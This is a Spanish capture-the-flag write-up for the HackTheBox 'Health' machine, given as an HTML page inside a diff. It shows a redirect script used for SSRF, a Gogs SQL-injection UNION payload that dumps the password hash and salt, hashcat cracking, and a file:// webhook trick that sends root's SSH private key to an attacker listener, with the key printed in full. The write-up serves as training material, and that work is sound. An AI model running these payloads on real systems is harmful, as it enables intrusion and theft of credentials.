@@ -1,0 +1,333 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Health HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/health.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Health HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Health de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Health de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Health HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Health HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Health de la plataforma de HackTheBox","headline":"Writeup Scrambled HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Health HackTheBox</h1>
+          <p>Resolución de la máquina Health de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap, podemos ver el 3000 filtrado</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 10.10.11.176
+Nmap scan report for 10.10.11.176
+PORT     STATE    SERVICE
+22/tcp   open     ssh
+80/tcp   open     http
+3000/tcp filtered ppp</span>
+</code></pre></div></div>
+
+<div><p>Si miramos la web podemos ver esto, podemos crear un webhook y testearlo</p></div>
+<div><p><img src="./1.png"><p></div>
+
+<div><p>Lo que haremos sera enviar una petición a un servicio que montaremos redirrecionandolo a su propio localhost por el puerto 3000 que veiamos filtered, y recibiremos la respuesta por el 4444</p></div>
+
+<div><p>Para eso usaremos un simple script que al recibir algo haga el redirect</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">import </span><span class="p">sys
+</span><span class="kd">from </span><span class="p">http.server </span><span class="kd">import </span><span class="p">HTTPServer, BaseHTTPRequestHandler
+
+</span><span class="k">class</span><span class="p"> Redirect(BaseHTTPRequestHandler):
+  </span><span class="na">def </span><span class="k">do_GET</span><span class="p">(</span><span class="no">self</span><span class="p">):
+      self.send_response(</span><span class="na">302</span><span class="p">)
+      self.send_header(</span><span class="s2">'Location'</span><span class="p">, sys.argv[</span><span class="na">1</span><span class="p">])
+      self.end_headers()
+
+HTTPServer((</span><span class="s2">"0.0.0.0"</span><span class="p">,</span><span class="na"> 80</span><span class="p">), Redirect).serve_forever()</span>
+</code></pre></div></div>
+
+<div><p>Dejamos un netcat en escucha por el 4444 y ejecutamos el exploit con la url de argumento</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ netcat</span><span class="p"> -lvnp 4444
+Listening on 0.0.0.0 4444</span>
+</code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo python3 </span><span class="p">redirect.py http://127.0.0.1:3000/
+</span>
+</code></pre></div></div>
+
+<div><p>Ahora tenemos que definir un webhook con la configuración que necesitamos</p></div>
+<div><p><img src="./2.png"><p></div>
+
+<div><p>Al darle a test como esta corriendo el script redirigira la petición a su 127.0.0.1:3000</p></div>
+<div><p>Cuando haga la petición nos enviará el codigo fuente a nuestro listener de netcat</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ netcat</span><span class="p"> -lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.10.11.176
+POST / HTTP/1.1
+Host: 10.10.14.10:4444
+Accept: */*
+Content-type: application/json
+Content-Length: 7662
+Expect: 100-continue
+
+{"webhookUrl":"http:\/\/10.10.14.10:4444","monitoredUrl":"http:\/\/10.10.14.10","health":"up","body":"&lt!DOCTYPE html>\n&lthtml>\n\t&lthead data-suburl=\"\">\n\t\t&ltmeta http-equiv=\"Content-Type\" content=\"text\/html; charset=UTF-8\" \/>\n        &ltmeta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"\/>\n        &ltmeta name=\"author\" content=\"Gogs - Go Git Service\" \/>\n\t\t&ltmeta name=\"description\" content=\"Gogs(Go Git Service) a painless self-hosted Git Service written in Go\" \/>\n\t\t&ltmeta name=\"keywords\" content=\"go, git, self-hosted, gogs\">\n\t\t&ltmeta name=\"_csrf\" content=\"PH20a-Z0JFJFonYFrjmdzeGyyV46MTY2MTEyNDMyMTAwNTMyNzg4MA==\" \/>\n\t\t\n\n\t\t&ltlink rel=\"shortcut icon\" href=\"\/img\/favicon.png\" \/>\n\n\t\t\n\t\t&ltlink rel=\"stylesheet\" href=\"\/\/maxcdn.bootstrapcdn.com\/font-awesome\/4.2.0\/css\/font-awesome.min.css\">\n\n\t\t&ltscript src=\"\/\/code.jquery.com\/jquery-1.11.1.min.js\">&lt\/script>\n\t\t\n\t\t\n\t\t&ltlink rel=\"stylesheet\" href=\"\/ng\/css\/ui.css\">\n\t\t&ltlink rel=\"stylesheet\" href=\"\/ng\/css\/gogs.css\">\n\t\t&ltlink rel=\"stylesheet\" href=\"\/ng\/css\/tipsy.css\">\n\t\t&ltlink rel=\"stylesheet\" href=\"\/ng\/css\/magnific-popup.css\">\n\t\t&ltlink rel=\"stylesheet\" href=\"\/ng\/fonts\/octicons.css\">\n\t\t&ltlink rel=\"stylesheet\" href=\"\/css\/github.min.css\">\n\n\t\t\n    \t&ltscript src=\"\/ng\/js\/lib\/lib.js\">&lt\/script>\n    \t&ltscript src=\"\/ng\/js\/lib\/jquery.tipsy.js\">&lt\/script>\n    \t&ltscript src=\"\/ng\/js\/lib\/jquery.magnific-popup.min.js\">&lt\/script>\n        &ltscript src=\"\/ng\/js\/utils\/tabs.js\">&lt\/script>\n        &ltscript src=\"\/ng\/js\/utils\/preview.js\">&lt\/script>\n\t\t&ltscript src=\"\/ng\/js\/gogs.js\">&lt\/script>\n\n\t\t&lttitle>Gogs: Go Git Service&lt\/title>\n\t&lt\/head>\n\t&ltbody>\n\t\t&ltdiv id=\"wrapper\">\n\t\t&ltnoscript>Please enable JavaScript in your browser!&lt\/noscript>\n\n&ltheader id=\"header\">\n    &ltul class=\"menu menu-line container\" id=\"header-nav\">\n        \n\n        \n            \n            &ltli class=\"right\" id=\"header-nav-help\">\n                &lta target=\"_blank\" href=\"http:\/\/gogs.io\/docs\">&lti class=\"octicon octicon-info\">&lt\/i>&nbsp;&nbsp;Help&lt\/a>\n            &lt\/li>\n            &ltli class=\"right\" id=\"header-nav-explore\">\n                &lta href=\"\/explore\">&lti class=\"octicon octicon-globe\">&lt\/i>&nbsp;&nbsp;Explore&lt\/a>\n            &lt\/li>\n            \n        \n    &lt\/ul>\n&lt\/header>\n&ltdiv id=\"promo-wrapper\">\n    &ltdiv class=\"container clear\">\n        &ltdiv id=\"promo-logo\" class=\"left\">\n            &ltimg src=\"\/img\/gogs-lg.png\" alt=\"logo\" \/>\n        &lt\/div>\n        &ltdiv id=\"promo-content\">\n            &lth1>Gogs&lt\/h1>\n            &lth2>A painless self-hosted Git service written in Go&lt\/h2>\n            &ltform id=\"promo-form\" action=\"\/user\/login\" method=\"post\">\n                &ltinput type=\"hidden\" name=\"_csrf\" value=\"PH20a-Z0JFJFonYFrjmdzeGyyV46MTY2MTEyNDMyMTAwNTMyNzg4MA==\">\n                &ltinput class=\"ipt ipt-large\" id=\"username\" name=\"uname\" type=\"text\" placeholder=\"Username or E-mail\"\/>\n                &ltinput class=\"ipt ipt-large\" name=\"password\" type=\"password\" placeholder=\"Password\"\/>\n                &ltinput name=\"from\" type=\"hidden\" value=\"home\">\n                &ltbutton class=\"btn btn-black btn-large\">Sign In&lt\/button>\n                &ltbutton class=\"btn btn-green btn-large\" id=\"register-button\">Register&lt\/button>\n            &lt\/form>\n            &ltdiv id=\"promo-social\" class=\"social-buttons\">\n                \n\n\n\n            &lt\/div>\n        &lt\/div>&nbsp;\n    &lt\/div>\n&lt\/div>\n&ltdiv id=\"feature-wrapper\">\n    &ltdiv class=\"container clear\">\n        \n        &ltdiv class=\"grid-1-2 left\">\n            &lti class=\"octicon octicon-flame\">&lt\/i>\n            &ltb>Easy to install&lt\/b>\n            &ltp>Simply &lta target=\"_blank\" href=\"http:\/\/gogs.io\/docs\/installation\/install_from_binary.html\">run the binary&lt\/a> for your platform. Or ship Gogs with &lta target=\"_blank\" href=\"https:\/\/github.com\/gogits\/gogs\/tree\/master\/dockerfiles\">Docker&lt\/a> or &lta target=\"_blank\" href=\"https:\/\/github.com\/geerlingguy\/ansible-vagrant-examples\/tree\/master\/gogs\">Vagrant&lt\/a>, or get it &lta target=\"_blank\" href=\"http:\/\/gogs.io\/docs\/installation\/install_from_packages.html\">packaged&lt\/a>.&lt\/p>\n        &lt\/div>\n        &ltdiv class=\"grid-1-2 left\">\n            &lti class=\"octicon octicon-device-desktop\">&lt\/i>\n            &ltb>Cross-platform&lt\/b>\n            &ltp>Gogs runs anywhere &lta target=\"_blank\" href=\"http:\/\/golang.org\/\">Go&lt\/a> can compile for: Windows, Mac OS X, Linux, ARM, etc. Choose the one you love!&lt\/p>\n        &lt\/div>\n        &ltdiv class=\"grid-1-2 left\">\n            &lti class=\"octicon octicon-rocket\">&lt\/i>\n            &ltb>Lightweight&lt\/b>\n            &ltp>Gogs has low minimal requirements and can run on an inexpensive Raspberry Pi. Save your machine energy!&lt\/p>\n        &lt\/div>\n        &ltdiv class=\"grid-1-2 left\">\n            &lti class=\"octicon octicon-code\">&lt\/i>\n            &ltb>Open Source&lt\/b>\n            &ltp>It's all on &lta target=\"_blank\" href=\"https:\/\/github.com\/gogits\/gogs\/\">GitHub&lt\/a>! Join us by contributing to make this project even better. Don't be shy to be a contributor!&lt\/p>\n        &lt\/div>\n        \n    &lt\/div>\n&lt\/div>\n\t\t&lt\/div>\n\t\t&ltfooter id=\"footer\">\n\t\t    &ltdiv class=\"container clear\">\n\t\t        &ltp class=\"left\" id=\"footer-rights\">\u00a9 2014 GoGits \u00b7 Version: 0.5.5.1010 Beta \u00b7 Page: &ltstrong>7ms&lt\/strong> \u00b7\n\t\t            Template: &ltstrong>7ms&lt\/strong>&lt\/p>\n\n\t\t        &ltdiv class=\"right\" id=\"footer-links\">\n\t\t            &lta target=\"_blank\" href=\"https:\/\/github.com\/gogits\/gogs\">&lti class=\"fa fa-github-square\">&lt\/i>&lt\/a>\n\t\t            &lta target=\"_blank\" href=\"https:\/\/twitter.com\/gogitservice\">&lti class=\"fa fa-twitter\">&lt\/i>&lt\/a>\n\t\t            &lta target=\"_blank\" href=\"https:\/\/plus.google.com\/communities\/115599856376145964459\">&lti class=\"fa fa-google-plus\">&lt\/i>&lt\/a>\n\t\t            &lta target=\"_blank\" href=\"http:\/\/weibo.com\/gogschina\">&lti class=\"fa fa-weibo\">&lt\/i>&lt\/a>\n\t\t            &ltdiv id=\"footer-lang\" class=\"inline drop drop-top\">Language\n\t\t                &ltdiv class=\"drop-down\">\n\t\t                    &ltul class=\"menu menu-vertical switching-list\">\n\t\t                    \t\n\t\t                        &ltli>&lta href=\"#\">English&lt\/a>&lt\/li>\n\t\t                        \n\t\t                        &ltli>&lta href=\"\/?lang=zh-CN\">\u7b80\u4f53\u4e2d\u6587&lt\/a>&lt\/li>\n\t\t                        \n\t\t                        &ltli>&lta href=\"\/?lang=zh-HK\">\u7e41\u9ad4\u4e2d\u6587&lt\/a>&lt\/li>\n\t\t                        \n\t\t                        &ltli>&lta href=\"\/?lang=de-DE\">Deutsch&lt\/a>&lt\/li>\n\t\t                        \n\t\t                        &ltli>&lta href=\"\/?lang=fr-CA\">Fran\u00e7ais&lt\/a>&lt\/li>\n\t\t                        \n\t\t                        &ltli>&lta href=\"\/?lang=nl-NL\">Nederlands&lt\/a>&lt\/li>\n\t\t                        \n\t\t                    &lt\/ul>\n\t\t                &lt\/div>\n\t\t            &lt\/div>\n\t\t            &lta target=\"_blank\" href=\"http:\/\/gogs.io\">Website&lt\/a>\n\t\t            &ltspan class=\"version\">Go1.3.2&lt\/span>\n\t\t        &lt\/div>\n\t\t    &lt\/div>\n\t\t&lt\/footer>\n\t&lt\/body>\n&lt\/html>","message":"HTTP\/1.0 302 Found","headers":{"Server":"BaseHTTP\/0.6 Python\/3.9.2","Date":"Sun, 21 Aug 2022 23:25:21 GMT","Location":"http:\/\/127.0.0.1:3000\/","Content-Type":"text\/html; charset=UTF-8","Set-Cookie":"_csrf=; Path=\/; Max-Age=0"}}</span>
+</code></pre></div></div>
+
+<div><p>Al darle forma al html y correrlo en local podemos ver que la web corre un gogs</p></div>
+<div><p><img src="./3.png"><p></div>
+
+<div><p>Buscando vulnerabilidades asociadas, podemos encontrar un <a href="https://www.exploit-db.com/exploits/35238">poc</a> de inyección sql</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ searchsploit </span><span class="p">gogs
+----------------------------------------------- -----------------------------
+ Exploit Title                                 |  Path
+----------------------------------------------- -----------------------------
+ Gogs - 'label' SQL Injection                  | multiple/webapps/35237.txt
+ Gogs - 'users'/'repos' '?q' SQL Injection     | multiple/webapps/35238.txt
+----------------------------------------------- -----------------------------</span>
+</code></pre></div></div>
+
+<div><p>Después de enumerar con el poc podemos cambiar el redirect por nuestro payload</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo python3 </span><span class="p">redirect.py</span><span class="no"> "http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,1,(select/**/passwd/**/from/**/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--"
+</span>
+</code></pre></div></div>
+
+<div><p>Testeamos el webhook como lo hicimos la vez pasada y recibimos más data</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ netcat </span><span class="p">-lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.10.11.176
+POST / HTTP/1.1
+Host: 10.10.14.10:4444
+Accept: */*
+Content-type: application/json
+Content-Length: 837
+
+{"webhookUrl":"http:\/\/10.10.14.10:4444\/","monitoredUrl":"http:\/\/10.10.14.10\/","health":"up","body":"{\"data\":[{\"username\":\"susanne\",\"avatar\":\"\/\/1.gravatar.com\/avatar\/c11d48f16f254e918744183ef7b89fce\"},{\"username\":\"66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37\",\"avatar\":\"\/\/1.gravatar.com\/avatar\/1\"}],\"ok\":true}","message":"HTTP\/1.0 302 Found","headers":{"Server":"BaseHTTP\/0.6 Python\/3.9.2","Date":"Sun, 21 Aug 2022 23:31:37 GMT","Location":"http:\/\/127.0.0.1:3000\/api\/v1\/users\/search?q=')\/**\/union\/**\/all\/**\/select\/**\/1,1,(select\/**\/passwd\/**\/from\/**\/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--","Content-Type":"application\/json; charset=UTF-8","Set-Cookie":"_csrf=; Path=\/; Max-Age=0","Content-Length":"264"}}</span>
+</code></pre></div></div>
+
+<div><p>Al darle forma a la parte de body podemos ver en el campo username a el usuario susanne, además en el segundo username el contenido del campo passwd seleccionado</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">{
+  </span><span class="na">"username"</span><span class="p">:</span><span class="s2"> "susanne"</span><span class="p">,
+  </span><span class="na">"avatar"</span><span class="p">:</span><span class="s2"> "//1.gravatar.com/avatar/c11d48f16f254e918744183ef7b89fce"</span><span class="p">,
+  </span><span class="na">"username"</span><span class="p">:</span><span class="s2"> "66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37"</span><span class="p">,
+  </span><span class="na">"avatar"</span><span class="p">:</span><span class="s2"> "//1.gravatar.com/avatar/1"</span><span class="p">
+}</span>
+</code></pre></div></div>
+
+<div><p>Haremos exactamente lo mismo pero cambiando el campo passwd por el campo salt</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo python3 </span><span class="p">redirect.py</span><span class="no"> "http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,1,(select/**/salt/**/from/**/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--"
+</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ netcat </span><span class="p">-lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.10.11.176
+POST / HTTP/1.1
+Host: 10.10.14.10:4444
+Accept: */*
+Content-type: application/json
+Content-Length: 745
+
+{"webhookUrl":"http:\/\/10.10.14.10:4444\/","monitoredUrl":"http:\/\/10.10.14.10\/","health":"up","body":"{\"data\":[{\"username\":\"susanne\",\"avatar\":\"\/\/1.gravatar.com\/avatar\/c11d48f16f254e918744183ef7b89fce\"},{\"username\":\"sO3XIbeW14\",\"avatar\":\"\/\/1.gravatar.com\/avatar\/1\"}],\"ok\":true}","message":"HTTP\/1.0 302 Found","headers":{"Server":"BaseHTTP\/0.6 Python\/3.9.2","Date":"Sun, 21 Aug 2022 23:32:19 GMT","Location":"http:\/\/127.0.0.1:3000\/api\/v1\/users\/search?q=')\/**\/union\/**\/all\/**\/select\/**\/1,1,(select\/**\/salt\/**\/from\/**\/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--","Content-Type":"application\/json; charset=UTF-8","Set-Cookie":"_csrf=; Path=\/; Max-Age=0","Content-Length":"174"}}</span>
+</code></pre></div></div>
+
+<div><p>Al darle forma podemos ver también en el segundo campo username el valor de salt</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">{
+  </span><span class="na">"username"</span><span class="p">:</span><span class="s2"> "susanne",
+  </span><span class="na">"avatar"</span><span class="p">:</span><span class="s2"> "//1.gravatar.com/avatar/c11d48f16f254e918744183ef7b89fce"</span><span class="p">,
+  </span><span class="na">"username"</span><span class="p">:</span><span class="s2"> "sO3XIbeW14"</span><span class="p">,
+  </span><span class="na">"avatar"</span><span class="p">:</span><span class="s2"> "//1.gravatar.com/avatar/1"</span><span class="p">
+}</span>
+</code></pre></div></div>
+
+<div><p>Con el passwd y salt podemos crear un formato hash que le guste a hashcat para romperlo</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ echo </span><span class="no">'sha256:10000:'</span><span class="k">$(</span><span class="s2">echo </span><span class="no">'sO3XIbeW14'</span><span class="p"> | </span><span class="s2">base64</span><span class="p"> |</span><span class="s2"> cut </span><span class="p">-c1-14</span><span class="k">)</span><span class="no">':'</span><span class="k">$(</span><span class="s2">echo</span><span class="no"> '66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37' </span><span class="p">|</span><span class="s2"> xxd</span><span class="p"> -r -p</span><span class="p"> |</span><span class="s2"> base64</span><span class="k">)</span><span class="p">
+sha256:10000:c08zWEliZVcxNA:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=</span>
+</code></pre></div></div>
+
+<div><p>Con este formato podemos romperlo facilmente con hashcat y el rockyou.txt</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ hashcat </span><span class="p">-m 10900 hash.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
+
+hashcat (v6.1.1) starting...
+
+sha256:10000:c08zWEliZVcxNA:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=:</span><span class="kd">february15</span><span class="p">
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: PBKDF2-HMAC-SHA256
+Hash.Target......: sha256:10000:c08zWEliZVcxNA:ZsB0ZFVFeB8QZPt/0Rd0U9u...9O/jc=</span>
+</code></pre></div></div>
+
+<div><p>Podemos usar el usuario susanne para conectarnos por ssh con la contraseña</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh </span><span class="p">susanne@10.10.11.176
+susanne@10.10.11.176's password: </span><span class="kd">february15</span><span class="p">
+</span><span class="s2">susanne@health</span><span class="p">:</span><span class="na">~</span><span class="p">$ id
+uid=1000(susanne) gid=1000(susanne) groups=1000(susanne)
+</span><span class="s2">susanne@health</span><span class="p">:</span><span class="na">~</span><span class="p">$ hostname -I
+10.10.11.176 dead:beef::250:56ff:fe96:b4ff 
+</span><span class="s2">susanne@health</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat user.txt 
+f7d**************************39f
+</span><span class="s2">susanne@health</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Buscando formas de escarlar podemos ver con <a href="https://github.com/DominicBreuker/pspy">pspy </a>2 tareas interesantes</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="na">UID=0    PID=2829   </span><span class="p">| /bin/bash -c cd /var/www/html && php artisan schedule:run >> /dev/null 2>&1 
+</span><span class="na">UID=0    PID=2850   </span><span class="p">| mysql laravel --execute TRUNCATE tasks</span>
+</code></pre></div></div>
+
+<div><p>En un archivo de configuración en /var/www/html podemos encontrar credenciales de mysql</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">susanne@health</span><span class="p">:</span><span class="na">/var/www/html</span><span class="p">$ cat .env | grep DB
+DB_CONNECTION=mysql
+DB_HOST=127.0.0.1
+DB_PORT=3306
+DB_DATABASE=</span><span class="kd">laravel</span><span class="p">
+DB_USERNAME=</span><span class="kd">laravel</span><span class="p">
+DB_PASSWORD=</span><span class="kd">MYsql_strongestpass@2014+</span><span class="p">
+</span><span class="s2">susanne@health</span><span class="p">:</span><span class="na">/var/www/html</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Además de eso en un archivo de la web encontramos una posible vulnerabilidad en el</p></div>
+<div><p>Envia lo que lea de monitoredUrl, esto se puede cambiar desde mysql y tenemos credenciales</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">susanne@health</span><span class="p">:</span><span class="na">/var/www/html/app/Http/Controllers</span><span class="p">$ cat HealthChecker.php | grep file -A8 -B4
+$json </span><span class="kd">=</span><span class="p"> [];
+$json[</span><span class="s2">'webhookUrl'</span><span class="p">]</span><span class="kd"> = </span><span class="p">$webhookUrl;
+$json[</span><span class="s2">'monitoredUrl'</span><span class="p">] </span><span class="kd">=</span><span class="p"> $monitoredUrl;
+
+$res </span><span class="kd">= @</span><span class="k">file_get_contents</span><span class="p">($monitoredUrl, </span><span class="na">false</span><span class="p">);
+</span><span class="kd">if</span><span class="p"> ($res) {
+
+    </span><span class="kd">if</span><span class="p"> ($onlyError) {
+        </span><span class="kd">return</span><span class="p"> $json;
+    }
+
+    $json[</span><span class="s2">'health'</span><span class="p">] </span><span class="kd">=</span><span class="s2"> "up"</span><span class="p">;
+    $json[</span><span class="s2">'body'</span><span class="p">]</span><span class="kd"> = </span><span class="p">$res;
+</span><span class="s2">susanne@health</span><span class="p">:</span><span class="na">/var/www/html/app/Http/Controllers</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Para explotarlo iniciamos dejando un listener de netcat por el puerto 80</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat</span><span class="p"> -lvnp 80
+Listening on 0.0.0.0 80</span>
+</code></pre></div></div>
+
+<div><p>Definimos un nuevo webhook apuntando a nuestro host, esta vez daremos a create</p></div>
+<div><p><img src="./4.png"><p></div>
+<div><p><img src="./5.png"><p></div>
+
+<div><p>Nos conectamos a mysql y cambiamos el valor de monitoredUrl a la id_rsa de root</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">susanne@health</span><span class="p">:</span><span class="na">~</span><span class="p">$ mysql -Dlaravel -ularavel -pMYsql_strongestpass@2014+
+
+Copyright (c) 2000, 2022, Oracle and/or its affiliates.
+
+</span><span class="kd">mysql></span><span class="p"> update tasks set monitoredUrl='file:///root/.ssh/id_rsa';
+Query OK, 1 rows affected (0.01 sec)
+Rows matched: 1  Changed: 1  Warnings: 0
+
+</span><span class="kd">mysql></span>
+</code></pre></div></div>
+
+<div><p>Esperamos un par de segundos y recibimos la id_rsa en data de nuestro listener de netcat</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat </span><span class="p">-lvnp 80
+Listening on 0.0.0.0 80
+Connection received on 10.10.11.176
+POST / HTTP/1.1
+Host: 10.10.14.10
+Accept: */*
+Content-type: application/json
+Content-Length: 1835
+Expect: 100-continue
+
+{"webhookUrl":"http:\/\/10.10.14.10\/","monitoredUrl":"file:\/\/\/root\/.ssh\/id_rsa","health":"up","body":"-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEAwddD+eMlmkBmuU77LB0LfuVNJMam9\/jG5NPqc2TfW4Nlj9gE\nKScDJTrF0vXYnIy4yUwM4\/2M31zkuVI007ukvWVRFhRYjwoEPJQUjY2s6B0ykCzq\nIMFxjreovi1DatoMASTI9Dlm85mdL+rBIjJwfp+Via7ZgoxGaFr0pr8xnNePuHH\/\nKuigjMqEn0k6C3EoiBGmEerr1BNKDBHNvdL\/XP1hN4B7egzjcV8Rphj6XRE3bhgH\n7so4Xp3Nbro7H7IwIkTvhgy61bSUIWrTdqKP3KPKxua+TqUqyWGNksmK7bYvzhh8\nW6KAhfnHTO+ppIVqzmam4qbsfisDjJgs6ZwHiQIDAQABAoIBAEQ8IOOwQCZikUae\nNPC8cLWExnkxrMkRvAIFTzy7v5yZToEqS5yo7QSIAedXP58sMkg6Czeeo55lNua9\nt3bpUP6S0c5x7xK7Ne6VOf7yZnF3BbuW8\/v\/3Jeesznu+RJ+G0ezyUGfi0wpQRoD\nC2WcV9lbF+rVsB+yfX5ytjiUiURqR8G8wRYI\/GpGyaCnyHmb6gLQg6Kj+xnxw6Dl\nhnqFXpOWB771WnW9yH7\/IU9Z41t5tMXtYwj0pscZ5+XzzhgXw1y1x\/LUyan++D+8\nefiWCNS3yeM1ehMgGW9SFE+VMVDPM6CIJXNx1YPoQBRYYT0lwqOD1UkiFwDbOVB2\n1bLlZQECgYEA9iT13rdKQ\/zMO6wuqWWB2GiQ47EqpvG8Ejm0qhcJivJbZCxV2kAj\nnVhtw6NRFZ1Gfu21kPTCUTK34iX\/p\/doSsAzWRJFqqwrf36LS56OaSoeYgSFhjn3\nsqW7LTBXGuy0vvyeiKVJsNVNhNOcTKM5LY5NJ2+mOaryB2Y3aUaSKdECgYEAyZou\nfEG0e7rm3z++bZE5YFaaaOdhSNXbwuZkP4DtQzm78Jq5ErBD+a1af2hpuCt7+d1q\n0ipOCXDSsEYL9Q2i1KqPxYopmJNvWxeaHPiuPvJA5Ea5wZV8WWhuspH3657nx8ZQ\nzkbVWX3JRDh4vdFOBGB\/ImdyamXURQ72Xhr7ODkCgYAOYn6T83Y9nup4mkln0OzT\nrti41cO+WeY50nGCdzIxkpRQuF6UEKeELITNqB+2+agDBvVTcVph0Gr6pmnYcRcB\nN1ZI4E59+O3Z15VgZ\/W+o51+8PC0tXKKWDEmJOsSQb8WYkEJj09NLEoJdyxtNiTD\nSsurgFTgjeLzF8ApQNyN4QKBgGBO854QlXP2WYyVGxekpNBNDv7GakctQwrcnU9o\n++99iTbr8zXmVtLT6cOr0bVVsKgxCnLUGuuPplbnX5b1qLAHux8XXb+xzySpJcpp\nUnRnrnBfCSZdj0X3CcrsyI8bHoblSn0AgbN6z8dzYtrrPmYA4ztAR\/xkIP\/Mog1a\nvmChAoGBAKcW+e5kDO1OekLdfvqYM5sHcA2le5KKsDzzsmboGEA4ULKjwnOXqJEU\n6dDHn+VY+LXGCv24IgDN6S78PlcB5acrg6m7OwDyPvXqGrNjvTDEY94BeC\/cQbPm\nQeA60hw935eFZvx1Fn+mTaFvYZFMRMpmERTWOBZ53GTHjSZQoS3G\n-----END RSA PRIVATE KEY-----\n"}</span>
+</code></pre></div></div>
+
+<div><p>Al darle forma cambiando \n por salto de linea y quitando \ nos queda la id_rsa de root</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
